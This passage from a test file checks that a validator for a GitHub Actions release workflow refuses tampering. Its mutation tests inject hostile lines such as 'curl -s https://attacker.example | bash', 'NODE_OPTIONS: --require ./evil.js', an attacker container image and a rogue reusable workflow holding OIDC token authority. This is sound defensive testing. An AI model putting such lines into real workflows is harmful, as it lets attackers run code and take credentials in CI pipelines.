    '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}\n          "NODE_OPTIONS": --require ./evil.js',
  );
  assert.equal(
    activeAt(quotedEnv, (wf) => wf.jobs['dev-preflight'].steps.at(-1).env.NODE_OPTIONS).value,
    '--require ./evil.js',
    'YAML must parse the quoted env key as ACTIVE configuration — that is the whole finding',
  );
  rejects(quotedEnv, 'a quoted NODE_OPTIONS env key');

  // (b) A QUOTED action input.
  const quotedWith = raw.replace(
    '          mask-aws-account-id: true',
    '          mask-aws-account-id: true\n          "role-duration-seconds": 43200',
  );
  assert.equal(
    activeAt(quotedWith, (wf) => wf.jobs['dev-preflight'].steps.find((s) => s.uses?.startsWith('aws-actions/')).with['role-duration-seconds']).value,
    43200,
  );
  rejects(quotedWith, 'a quoted action input');

  // (c) Job-level env, and a job-level container.
  const jobEnv = raw.replace(
    '  dev-stage:\n    name: Dev stage — deploy AWS (dev)',
    '  dev-stage:\n    env:\n      NODE_OPTIONS: --require ./evil.js\n    name: Dev stage — deploy AWS (dev)',
  );
  assert.equal(activeAt(jobEnv, (wf) => wf.jobs['dev-stage'].env.NODE_OPTIONS).value, '--require ./evil.js');
  rejects(jobEnv, 'a job-level env block');

  const container = raw.replace(
    '  dev-stage:\n    name: Dev stage — deploy AWS (dev)',
    '  dev-stage:\n    container: attacker/example:latest\n    name: Dev stage — deploy AWS (dev)',
  );
  assert.equal(activeAt(container, (wf) => wf.jobs['dev-stage'].container).value, 'attacker/example:latest');
  rejects(container, 'a job-level container');

  // (d) The QUOTED sixth job calling a remote reusable workflow — five jobs to the old parser,
  // six to YAML, with id-token: write.
  const rogue = `${raw}\n  "rogue":\n    permissions:\n      contents: read\n      id-token: write\n    uses: attacker/example/.github/workflows/release.yml@main\n`;
  assert.equal(
    activeAt(rogue, (wf) => wf.jobs.rogue.uses).value,
    'attacker/example/.github/workflows/release.yml@main',
    'YAML must parse the quoted job id as a real sixth job',
  );
  const rogueErrors = releaseLaneErrors(rogue);
  assert.ok(rogueErrors.some((e) => e.includes('jobs.rogue')), 'the diff must name the rogue job');
  assert.ok(rogueErrors.some((e) => e.includes('job-level uses')), 'the reusable-workflow call must be refused by its own rule too');

  // And a duplicate key — two `permissions:` mappings at the top level — is refused at parse time.
  const dup = raw.replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\npermissions:\n  contents: read\n');
  assert.notEqual(dup, raw);
  assert.ok(releaseLaneErrors(dup).some((e) => e.includes('not clean YAML')), 'duplicate keys must refuse at parse time');
});

test('POSITIVE CONTROL: round-8 — OIDC authority requires a reviewed consumer, by its own rule', () => {
  // Grant id-token: write back to the placeholder stage. YAML must parse it as active...
  const withOidc = raw.replace(
    '    environment: pilot\n    permissions:\n      contents: read\n    steps:',
    '    environment: pilot\n    permissions:\n      contents: read\n      id-token: write\n    steps:',
  );
  assert.notEqual(withOidc, raw, 'mutation did not apply: id-token on a placeholder');
  assert.equal(activeAt(withOidc, (wf) => wf.jobs['pilot-stage'].permissions['id-token']).value, 'write');
  // ...and the refusal must come from the OIDC RULE SPECIFICALLY. The reviewed-object diff also
  // fires today, but the day the reviewed object is edited to include the permission, the diff goes
  // silent — the named rule is what keeps the regression discriminating across that edit.
  assert.ok(
    releaseLaneErrors(withOidc).some((e) => e.includes('id-token: write with no reviewed OIDC consumer')),
    'the OIDC rule must refuse a placeholder holding token authority',
  );

  // And the preflight jobs — which DO carry the pinned consumer — are not flagged by the rule.
  assert.equal(
    releaseLaneErrors(raw).some((e) => e.includes('no reviewed OIDC consumer')),
    false,
    'the rule must not fire where the consumer is present',
  );
});

test('POSITIVE CONTROL: release identity cannot be weakened', () => {
  rejects(raw.replace(' || [ -n "${RELEASE_SHA//[0-9a-f]/}" ]', ''), 'the whole-string charset check removed');
  rejects(raw.replace('          type=$(git cat-file -t "$RELEASE_SHA" 2>/dev/null || true)\n', '          type=commit\n'), 'the commit-object proof removed');
  rejects(raw.replace('if ! git merge-base --is-ancestor "$resolved" origin/main; then', 'if false; then'), 'the ancestry check removed');
  rejects(raw.replace('release_sha=$resolved', 'release_sha=$RELEASE_SHA'), 'the raw input emitted instead of the resolved OID');
  rejects(raw.replace('          ref: main\n          fetch-depth: 0\n', '          ref: ${{ inputs.release_sha }}\n'), 'the identity job checks out the unvalidated candidate');
  rejects(
    raw.replace('  global-preflight:\n    name: Release identity (shape, object type and ancestry)\n    runs-on: ubuntu-latest\n', '  global-preflight:\n    name: Release identity (shape, object type and ancestry)\n    runs-on: ubuntu-latest\n    environment: dev\n'),
    'the identity job can read environment configuration',
  );
});

test('POSITIVE CONTROL: pinning, inputs, gating and credentials cannot be loosened', () => {
  rejects(raw.replaceAll('          ref: ${{ needs.global-preflight.outputs.release_sha }}\n', ''), 'unpinned checkouts');
  rejects(raw.replaceAll('ref: ${{ needs.global-preflight.outputs.release_sha }}', 'ref: ${{ inputs.release_sha }}'), 'checkouts pinned to the raw input');
  rejects(raw.replaceAll('          persist-credentials: false\n', ''), 'checkouts persist credentials');
  rejects(raw.replace('      mode:', '      environment:\n        description: x\n        required: true\n        type: string\n      mode:'), 'an environment input');
  rejects(raw.replace('      mode:', '      auth_callback_urls:\n        description: x\n        required: true\n        type: string\n      mode:'), 'a caller-supplied URL input');
  rejects(raw.replace('on:\n  workflow_dispatch:', 'on:\n  push:\n    branches: [main]\n  workflow_dispatch:'), 'an automatic trigger');
  rejects(raw.replace("    if: needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'", "    if: needs.global-preflight.result == 'success'"), 'pilot entry without the dev stage or the mode');
  rejects(raw.replace('\n    needs: [global-preflight, dev-preflight, dev-stage]', '\n    needs: [global-preflight]'), 'pilot-preflight detached from the dev stage');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success' && (inputs.mode == 'dev_only' || inputs.mode == 'abandon')\n    runs-on", "    if: needs.dev-preflight.result == 'success' || true\n    runs-on"), '|| true');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success' && (inputs.mode == 'dev_only' || inputs.mode == 'abandon')\n    runs-on", '    if: always()\n    runs-on'), 'always()');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success' && (inputs.mode == 'dev_only' || inputs.mode == 'abandon')\n    runs-on", '    runs-on'), 'a dependency with no explicit success condition');
  rejects(raw.replaceAll('secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN', 'vars.AWS_DEPLOY_PREFLIGHT_ROLE_ARN'), 'the role ARN moved to a variable');
  rejects(raw.replaceAll('          mask-aws-account-id: true\n', ''), 'account-id masking removed');
  rejects(raw.replace('${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}', `arn:aws:iam::${'9'.repeat(12)}:role/x`), 'a literal IAM ARN');

  // The pin rule keeps ITS OWN error: the schema diff would flag the unknown value anyway, and a
  // control satisfied by that redundancy goes green when the pin rule is deleted.
  const tagged = raw.replace('actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7', 'actions/checkout@v7');
  assert.notEqual(tagged, raw);
  assert.ok(releaseLaneErrors(tagged).some((e) => e.includes('mutable ref')), 'a tag reference must be refused by the pin rule itself');
});

test('POSITIVE CONTROL: reviewed step objects cannot grow properties, env entries or new commands', () => {
  rejects(
    raw.replace(
      "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"",
      "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\n          curl -s https://attacker.example | bash",
    ),
    'a template with an injected line',
  );
  rejects(
    injectDevStep('      - name: Deploy\n        run: |\n          verb=deploy\n          npx cdk "$verb" --all'),
    'verb=deploy; npx cdk "$verb" --all',
  );
  rejects(
    injectDevStep('      - name: Deploy\n        uses: someorg/cdk-deploy-action@v1\n        with:\n          stacks: all'),
    'a deploy action outside the reviewed object',
  );
  rejects(
    injectDevStep('      - name: Sneak\n        run: npx cdk deploy --all'),
    'a single-line run outside the reviewed object',
  );
  rejects(
    raw.replace('      - name: Slice A stops here\n        run: |', '      - name: Slice A stops here\n        shell: python\n        run: |'),
    'a shell override on a reviewed run step',
  );
  rejects(
    raw.replace(
      '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}',
      '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}\n          NODE_OPTIONS: --require ./evil.js',
    ),
    'NODE_OPTIONS smuggled into a reviewed run step',
  );
});

/** Replace the dev stage's terminal step with an arbitrary injected step, for bypass mutations. */
function injectDevStep(step) {
  // Since Slice B1 the placeholder echo survives only in pilot-stage, as the file's final step —
  // the injection target moves with it, and the single-occurrence guard in rejects() still holds.
  return raw.replace(
    '      - name: Slice A stops here\n        run: |\n          echo "Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,"\n          echo "no account mutation and no paid call happened in this run."',
    step,
  );
}

/* ================= the identity script, EXECUTED =============================================== */
//
// A shell pattern can only be trusted by running it: the committed `[0-9a-f]*` check accepted "a"
// followed by 39 uppercase Zs, and no text assertion saw it. The script is taken from the PARSED
// object — the same string GitHub would execute — and run under a stubbed git.

function identityScript() {
  const { wf } = parseWorkflow(raw);
  const step = wf.jobs['global-preflight'].steps.find((s) => s.name === 'Validate release identity');
  assert.ok(step && typeof step.run === 'string', 'the identity step exists in the parsed object');
  return step.run;
}

function runIdentity({ sha, type = 'commit', resolved = '', ancestorExit = 0, correlation = `cba-70-${'0'.repeat(32)}` }) {
  const script = identityScript();
  const dir = fs.mkdtempSync(join(os.tmpdir(), 'cba-identity-'));
  try {
    const calls = join(dir, 'calls.log');
    fs.writeFileSync(calls, '');
    fs.writeFileSync(
      join(dir, 'git'),
      [
        '#!/usr/bin/env bash',
        'echo "$*" >> "$GIT_CALLS"',
        'last="${@: -1}"',
        'case "$1" in',
        '  fetch) exit 0 ;;',
        '  cat-file)',
        '    if [ "$GIT_TYPE" = "missing" ]; then exit 128; fi',
        "    printf '%s\\n' \"$GIT_TYPE\" ;;",
        '  rev-parse)',
        "    oid=$(printf '%s' \"$last\" | sed 's/\\^{commit}$//')",
        "    if [ -n \"$GIT_RESOLVED\" ]; then printf '%s\\n' \"$GIT_RESOLVED\"; else printf '%s\\n' \"$oid\"; fi ;;",
        '  merge-base) exit "$GIT_ANCESTOR_EXIT" ;;',
        '  *) exit 1 ;;',
        'esac',
        '',
      ].join('\n'),
      { mode: 0o755 },
    );
    const outFile = join(dir, 'github-output');
    fs.writeFileSync(outFile, '');
    const res = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${dir}:${process.env.PATH}`,
        RELEASE_SHA: sha,
        CORRELATION_ID: correlation,
        GITHUB_OUTPUT: outFile,
        GIT_CALLS: calls,
        GIT_TYPE: type,
        GIT_RESOLVED: resolved,
        GIT_ANCESTOR_EXIT: String(ancestorExit),
      },
    });
    return { status: res.status, calls: fs.readFileSync(calls, 'utf8'), out: fs.readFileSync(outFile, 'utf8') };
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const OID = 'a'.repeat(40);

test('EXECUTED: the exact round-2 value — "a" plus 39 uppercase Zs — is refused before git runs', () => {
  const r = runIdentity({ sha: `a${'Z'.repeat(39)}` });
  assert.notEqual(r.status, 0);
  assert.equal(r.calls, '', 'the shape check must refuse BEFORE any git invocation');
});

test('EXECUTED: short values and ref-shaped names never reach git', () => {
  for (const sha of ['a'.repeat(39), 'a'.repeat(41), 'main', `refs/heads/${'a'.repeat(29)}`, OID.toUpperCase(), '']) {
    const r = runIdentity({ sha });
    assert.notEqual(r.status, 0, JSON.stringify(sha));
    assert.equal(r.calls, '', `${JSON.stringify(sha)} must be refused before git`);
  }
});

test('EXECUTED: a 40-hex OID that is not a commit is refused', () => {
  for (const type of ['tag', 'blob', 'tree', 'missing']) {
    const r = runIdentity({ sha: OID, type });
    assert.notEqual(r.status, 0, type);
    assert.match(r.calls, /cat-file -t/, type);
  }
});

test('EXECUTED: a resolution that differs from the input is refused — nothing mutable is emitted', () => {
  const r = runIdentity({ sha: OID, resolved: 'b'.repeat(40) });
  assert.notEqual(r.status, 0);
  assert.equal(r.out.includes('release_sha='), false, 'no output may be emitted on refusal');
});

test('EXECUTED: a non-ancestor of main is refused', () => {
  const r = runIdentity({ sha: OID, ancestorExit: 1 });
  assert.notEqual(r.status, 0);
  assert.match(r.calls, /merge-base --is-ancestor/);
});

test('EXECUTED: a malformed correlation id is refused BEFORE any git invocation', () => {
  // SPEC-LANE-006: closed grammar, refused in the global preflight — before fetch, before any
  // credentialed stage. The release SHA is valid here so the refusal is attributable.
  for (const bad of ['', 'cba-70-123', `cba-70-${'0'.repeat(31)}Z`, `cba-71-${'0'.repeat(32)}`, '0'.repeat(39), `cba-70-${'0'.repeat(32)} `, `CBA-70-${'0'.repeat(32)}`]) {
    const r = runIdentity({ sha: OID, correlation: bad });
    assert.notEqual(r.status, 0, JSON.stringify(bad));
    assert.equal(r.calls.trim(), '', `no git call may run for ${JSON.stringify(bad)}`);
    assert.equal(r.out.trim(), '', 'nothing is emitted for a refused dispatch');
  }
});

test('EXECUTED: the happy path emits the resolved OID, in order, after every proof', () => {
  const r = runIdentity({ sha: OID });
  assert.equal(r.status, 0, r.calls);
  assert.equal(r.out.trim(), `release_sha=${OID}`);
  const order = ['fetch', 'cat-file', 'rev-parse', 'merge-base'];
  let last = -1;
  for (const step of order) {
    const idx = r.calls.indexOf(step);
    assert.ok(idx > last, `${step} runs, and after the previous proof`);
    last = idx;
  }
});
